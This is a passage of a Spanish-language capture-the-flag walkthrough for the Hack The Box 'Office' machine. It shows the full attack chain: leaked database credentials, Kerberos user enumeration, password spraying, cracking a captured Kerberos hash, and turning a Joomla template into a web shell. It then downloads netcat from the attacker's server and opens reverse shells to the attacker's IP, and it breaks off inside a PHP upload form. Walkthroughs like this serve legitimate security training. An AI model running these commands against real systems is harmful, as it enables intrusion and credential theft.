      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"debug"</span>: <span class="nb">false</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"debug_lang"</span>: <span class="nb">false</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"debug_lang_const"</span>: <span class="nb">true</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"dbtype"</span>: <span class="s2">"mysqli"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"host"</span>: <span class="s2">"localhost"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"user"</span>: <span class="s2">"root"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"password"</span>: <span class="s2">"H0lOgrams4reTakIng0Ver754!"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"db"</span>: <span class="s2">"joomla_db"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"dbprefix"</span>: <span class="s2">"if2tx_"</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"dbencryption"</span>: 0,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>,
    <span class="o">{</span>
      <span class="s2">"type"</span>: <span class="s2">"application"</span>,
      <span class="s2">"id"</span>: <span class="s2">"224"</span>,
      <span class="s2">"attributes"</span>: <span class="o">{</span>
        <span class="s2">"dbsslverifyservercert"</span>: <span class="nb">false</span>,
        <span class="s2">"id"</span>: 224
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">]</span>,
  <span class="s2">"meta"</span>: <span class="o">{</span>
    <span class="s2">"total-pages"</span>: 4
  <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p>La contraseña es de la base de datos <code class="language-plaintext highlighter-rouge">H0lOgrams4reTakIng0Ver754!</code> pero podemos probarla en el panel de login del Joomla aun así.</p>
  </li>
  <li>
    <p>Si recordamos hay un usuario que se llama Tony Stark.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/office/2.png" />
</p>

<ul>
  <li>No funcionan.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/office/3.png" />
</p>

<ul>
  <li>Bueno tenemos una contraseña pero no usuarios lo que podemos hacer es enumerar usuarios del dominio con kerbrute <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> office.htb <span class="nt">--dc</span> dc.office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 07/18/24 - Ronnie Flathers @ropnop

2024/07/18 18:20:37 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/07/18 18:20:37 <span class="o">&gt;</span>  	dc.office.htb:88

2024/07/18 18:20:59 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 administrator@office.htb
2024/07/18 18:23:13 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@office.htb
2024/07/18 18:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 etower@office.htb
2024/07/18 18:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ewhite@office.htb
2024/07/18 18:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 dwolfe@office.htb
2024/07/18 18:24:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 dlanor@office.htb
2024/07/18 18:24:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 dmichael@office.htb
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>users.txt
administrator
ewhite
etower
dwolfe
dlanor
dmichael
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos usuarios así que ahora podemos usar crackmapexec para ver si algún usuario usa la contraseña.</p>
  </li>
  <li>
    <p>Y bueno el usuario dwolfe usa la contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb office.htb <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'H0lOgrams4reTakIng0Ver754!'</span> <span class="nt">--continue-on-success</span>
SMB         office.htb      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\a</span>dministrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\e</span>white:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\e</span>tower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         office.htb      445    DC               <span class="o">[</span>+] office.htb<span class="se">\d</span>wolfe:H0lOgrams4reTakIng0Ver754!
SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\d</span>lanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB         office.htb      445    DC               <span class="o">[</span>-] office.htb<span class="se">\d</span>michael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
</code></pre></div></div>

<ul>
  <li>Como tenemos credenciales ahora si podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">SMB</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb office.htb <span class="nt">-u</span> <span class="s1">'dwolfe'</span> <span class="nt">-p</span> <span class="s1">'H0lOgrams4reTakIng0Ver754!'</span> <span class="nt">--shares</span>
SMB         office.htb      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         office.htb      445    DC               <span class="o">[</span>+] office.htb<span class="se">\d</span>wolfe:H0lOgrams4reTakIng0Ver754!
SMB         office.htb      445    DC               <span class="o">[</span>+] Enumerated shares
SMB         office.htb      445    DC               Share           Permissions     Remark
SMB         office.htb      445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         office.htb      445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         office.htb      445    DC               C<span class="nv">$ </span>                             Default share
SMB         office.htb      445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         office.htb      445    DC               NETLOGON        READ            Logon server share
SMB         office.htb      445    DC               SOC Analysis    READ
SMB         office.htb      445    DC               SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Hay un recurso interesante que se llama <code class="language-plaintext highlighter-rouge">SOC Analysis</code> vamos a conectarnos para examinar.</p>
  </li>
  <li>
    <p>Y bueno vemos un <code class="language-plaintext highlighter-rouge">.pcap</code> vamos a descargarlo para ver que contiene.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbclient <span class="s1">'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@office.htb'</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
IPC<span class="err">$</span>
NETLOGON
SOC Analysis
SYSVOL
<span class="c"># use SOC Analysis</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Wed May 10 12:52:24 2023 <span class="nb">.</span>
drw-rw-rw-          0  Wed Feb 14 04:18:31 2024 ..
<span class="nt">-rw-rw-rw-</span>    1372860  Wed May 10 12:51:42 2023 Latest-System-Dump-8fbc124d.pcap
<span class="c"># get Latest-System-Dump-8fbc124d.pcap</span>
</code></pre></div></div>

<ul>
  <li>Vamos a examinarlo con <code class="language-plaintext highlighter-rouge">Wireshark</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wireshark <span class="nt">-r</span> Latest-System-Dump-8fbc124d.pcap &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
<span class="o">[</span>1] 19927
</code></pre></div></div>

<ul>
  <li>Bueno hay demasiados paquetes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/office/4.png" />
</p>

<ul>
  <li>Como estamos ante un Domain Controller y filtramos por kerberos encontramos 2 peticiones y examinando una encontramos lo que parece ser un hash.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/office/5.png" />
</p>

<ul>
  <li>Vemos que el hash pertenece al usuario tstark.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/office/6.png" />
</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Hashcat</code> nos comparte la forma correcta en la cual el hash debería estar para poder crackearlo <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$krb5pa$18$tstark$OFFICE</span>.HTB<span class="nv">$a16f4806da05760af63c566d566f071c5bb35d0a414459417613</span>
a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora usando el Hash Mode que corresponde a Kerberos podemos crackearlo.</p>
  </li>
  <li>
    <p>Tenemos la contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hashcat <span class="nt">-m</span> 19900 hash.txt /usr/share/wordlists/rockyou.txt
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting

OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
<span class="o">==================================================================================================================================================</span>
<span class="k">*</span> Device <span class="c">#1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 1426/2916 MB (512 MB allocatable), 2MCU</span>

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
<span class="k">*</span> Zero-Byte
<span class="k">*</span> Not-Iterated
<span class="k">*</span> Single-Hash
<span class="k">*</span> Single-Salt
<span class="k">*</span> Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger <span class="nb">set </span>to 90c

Host memory required <span class="k">for </span>this attack: 0 MB

Dictionary cache hit:
<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
<span class="k">*</span> Passwords.: 14344385
<span class="k">*</span> Bytes.....: 139921507
<span class="k">*</span> Keyspace..: 14344385

<span class="nv">$krb5pa$18$tstark$OFFICE</span>.HTB<span class="nv">$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc</span>:playboy69

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 <span class="o">(</span>Kerberos 5, etype 18, Pre-Auth<span class="o">)</span>
Hash.Target......: <span class="nv">$krb5pa$18$tstark$OFFICE</span>.HTB<span class="nv">$a16f4806da05760af63c56</span>...86f5fc
Time.Started.....: Thu Jul 18 18:51:55 2024 <span class="o">(</span>2 secs<span class="o">)</span>
Time.Estimated...: Thu Jul 18 18:51:57 2024 <span class="o">(</span>0 secs<span class="o">)</span>
Kernel.Feature...: Pure Kernel
Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:     5459 H/s <span class="o">(</span>11.00ms<span class="o">)</span> @ Accel:256 Loops:512 Thr:1 Vec:16
Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
Progress.........: 5120/14344385 <span class="o">(</span>0.04%<span class="o">)</span>
Rejected.........: 0/5120 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 4608/14344385 <span class="o">(</span>0.03%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3584-4095
Candidate.Engine.: Device Generator
Candidates.#1....: Liverpool -&gt; babygrl
Hardware.Mon.#1..: Util: 99%

Started: Thu Jul 18 18:51:17 2024
Stopped: Thu Jul 18 18:51:58 2024
</code></pre></div></div>

<ul>
  <li>Tenemos credenciales nuevas <code class="language-plaintext highlighter-rouge">tstark:playboy69</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb office.htb <span class="nt">-u</span> <span class="s1">'tstark'</span> <span class="nt">-p</span> <span class="s1">'playboy69'</span>
SMB         office.htb      445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         office.htb      445    DC               <span class="o">[</span>+] office.htb<span class="se">\t</span>stark:playboy69
</code></pre></div></div>

<ul>
  <li>Ahora si nos podemos conectar al Joomla.</li>
</ul>

<blockquote>
  <p>Las credenciales con ese usuario no funcionan pero como el único usuario que vemos es Tony Stark podemos suponer que el es el usuario administrador del sitio así que si vamos al panel de login y usamos las siguientes credenciales podemos conectarnos <code class="language-plaintext highlighter-rouge">administrator:playboy69</code>.</p>
</blockquote>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/office/7.png" />
</p>

<blockquote>
  <p>Hay un Template que se llama Cassiopeia el cual podemos ver que ejecuta PHP, System –&gt; Site Templates –&gt; Cassiopeia Details and Files vamos a editar el archivo error.php para poder obtener ejecución remota de comandos ya que podemos hacerlo por que estamos como el usuario Administrador.</p>
</blockquote>

<ul>
  <li>Vamos a eliminar todo el contenido que tiene y a poner esta simple línea para que mediante el parámetro cmd poder hacer ejecución de comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/office/8.png" />
</p>

<ul>
  <li>
    <p>Ahora le damos click a Save para guardar los cambios.</p>
  </li>
  <li>
    <p>Funciona.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s1">'http://office.htb/templates/cassiopeia/error.php?cmd=whoami'</span>
office<span class="se">\w</span>eb_account
</code></pre></div></div>

<ul>
  <li>Ahora para ganar acceso vamos a subir el netcat a la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora simplemente hacemos la petición para descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s1">'http://office.htb/templates/cassiopeia/error.php?cmd=powershell+iwr+10.10.14.74:80/nc.exe+-O+nc.exe'</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Nos enviamos la reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s1">'http://office.htb/templates/cassiopeia/error.php?cmd=nc.exe+10.10.14.74+443+-e+cmd.exe'</span>
</code></pre></div></div>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span>  443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.74] from office.htb <span class="o">[</span>10.10.11.3] 58197
Microsoft Windows <span class="o">[</span>Version 10.0.20348.2322]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;whoami
<span class="nb">whoami
</span>office<span class="se">\w</span>eb_account

C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;
</code></pre></div></div>

<h2 id="shell-as-tstark">Shell as tstark</h2>

<ul>
  <li>El usuario tstark esta usuario valido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;net user
net user

User accounts <span class="k">for</span> <span class="se">\\</span>DC

<span class="nt">-------------------------------------------------------------------------------</span>
Administrator            dlanor                   dmichael
dwolfe                   etower                   EWhite
Guest                    HHogan                   krbtgt
PPotts                   tstark                   web_account
The <span class="nb">command </span>completed successfully.


C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;
</code></pre></div></div>

<ul>
  <li>Como tenemos credenciales vamos a usar Runas <a href="https://github.com/antonioCoco/RunasCs/releases">https://github.com/antonioCoco/RunasCs/releases</a> para enviarnos una shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;powershell iwr http://10.10.14.74/RunasCs.exe <span class="nt">-o</span> RunasCs.exe
powershell iwr http://10.10.14.74/RunasCs.exe <span class="nt">-o</span> RunasCs.exe
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
</code></pre></div></div>

<ul>
  <li>Nos enviamos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\j</span>oomla<span class="se">\t</span>emplates<span class="se">\c</span>assiopeia&gt;.<span class="se">\R</span>unasCs.exe tstark playboy69 cmd.exe <span class="nt">-r</span> 10.10.14.74:4444
.<span class="se">\R</span>unasCs.exe tstark playboy69 cmd.exe <span class="nt">-r</span> 10.10.14.74:4444
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Warning: The logon <span class="k">for </span>user <span class="s1">'tstark'</span> is limited. Use the flag combination <span class="nt">--bypass-uac</span> and <span class="nt">--logon-type</span> <span class="s1">'8'</span> to obtain a more privileged token.

<span class="o">[</span>+] Running <span class="k">in </span>session 0 with process <span class="k">function </span>CreateProcessWithLogonW<span class="o">()</span>
<span class="o">[</span>+] Using Station<span class="se">\D</span>esktop: Service-0x0-a4110<span class="nv">$\</span>Default
<span class="o">[</span>+] Async process <span class="s1">'C:\Windows\system32\cmd.exe'</span> with pid 6024 created <span class="k">in </span>background.
</code></pre></div></div>

<ul>
  <li>Ahora estamos como ese usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.74] from office.htb <span class="o">[</span>10.10.11.3] 58226
Microsoft Windows <span class="o">[</span>Version 10.0.20348.2322]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>office<span class="se">\t</span>stark

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="shell-as-ppotts">Shell as ppotts</h2>

<ul>
  <li>Bueno podemos ver la user flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type  C:<span class="se">\u</span>sers<span class="se">\t</span>stark<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type  </span>C:<span class="se">\u</span>sers<span class="se">\t</span>stark<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
7a8bcc49138ecf42c7a6202ab4129dd2

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<ul>
  <li>Vemos que al parecer hay otro web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is C626-9388

 Directory of C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal

01/30/2024  09:39 AM    &lt;DIR&gt;          <span class="nb">.</span>
05/09/2023  07:53 AM    &lt;DIR&gt;          ..
02/14/2024  06:35 PM    &lt;DIR&gt;          applications
05/01/2023  04:27 PM    &lt;DIR&gt;          css
05/01/2023  04:27 PM    &lt;DIR&gt;          img
01/30/2024  09:38 AM             5,113 index.html
01/30/2024  09:40 AM             5,282 resume.php
               2 File<span class="o">(</span>s<span class="o">)</span>         10,395 bytes
               5 Dir<span class="o">(</span>s<span class="o">)</span>   5,069,225,984 bytes free

C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;
</code></pre></div></div>

<ul>
  <li>Vemos que nos hablan sobre una subida de archivos al parecer de un resume.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\i</span>nternal&gt;type resume.php
<span class="nb">type </span>resume.php
&lt;?php
<span class="nv">$notifi</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
<span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s2">"REQUEST_METHOD"</span><span class="o">]</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="o">){</span>
  <span class="nv">$stdname</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'fullname'</span><span class="o">])</span><span class="p">;</span>
  <span class="nv">$email</span><span class="o">=</span>str_replace<span class="o">(</span><span class="s1">'.'</span>,<span class="s1">'-'</span>,<span class="nv">$_POST</span><span class="o">[</span><span class="s1">'email'</span><span class="o">])</span><span class="p">;</span>
  <span class="nv">$experience</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'experience'</span><span class="o">])</span><span class="p">;</span>
  <span class="nv">$salary</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'salary'</span><span class="o">])</span><span class="p">;</span>
  <span class="nv">$department</span><span class="o">=</span>trim<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'department'</span><span class="o">])</span><span class="p">;</span>
  <span class="nv">$rewritefn</span> <span class="o">=</span> strtolower<span class="o">(</span>str_replace<span class="o">(</span><span class="s1">' '</span>,<span class="s1">'-'</span>,<span class="s2">"</span><span class="nv">$stdname</span><span class="s2">-</span><span class="nv">$department</span><span class="s2">-</span><span class="nv">$salary</span><span class="s2"> </span><span class="nv">$experience</span><span class="s2"> </span><span class="nv">$email</span><span class="s2">"</span><span class="o">))</span><span class="p">;</span>

  <span class="nv">$filename</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'name'</span><span class="o">]</span><span class="p">;</span>
  <span class="nv">$filetype</span><span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'type'</span><span class="o">]</span><span class="p">;</span>
  <span class="nv">$filesize</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'size'</span><span class="o">]</span><span class="p">;</span>
  <span class="nv">$fileerr</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'error'</span><span class="o">]</span><span class="p">;</span>
  <span class="nv">$filetmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">]</span><span class="p">;</span>
  <span class="nb">chmod</span><span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'assignment'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">]</span>, 0664<span class="o">)</span><span class="p">;</span>
  // onigiri <span class="k">in</span> <span class="nb">.</span>
 <span class="nv">$ext</span> <span class="o">=</span> explode<span class="o">(</span><span class="s1">'.'</span>,<span class="nv">$filename</span><span class="o">)</span><span class="p">;</span>
  //last piece of data from array
 <span class="nv">$extension</span> <span class="o">=</span> strtolower<span class="o">(</span>end<span class="o">(</span><span class="nv">$ext</span><span class="o">))</span><span class="p">;</span>
  <span class="nv">$filesallowed</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">'docm'</span>,<span class="s1">'docx'</span>,<span class="s1">'doc'</span>,<span class="s1">'odt'</span><span class="o">)</span><span class="p">;</span>
   <span class="k">if</span><span class="o">(</span>in_array<span class="o">(</span><span class="nv">$extension</span>,<span class="nv">$filesallowed</span><span class="o">)){</span>
     <span class="k">if</span> <span class="o">(</span><span class="nv">$fileerr</span> <span class="o">===</span> 0<span class="o">){</span>
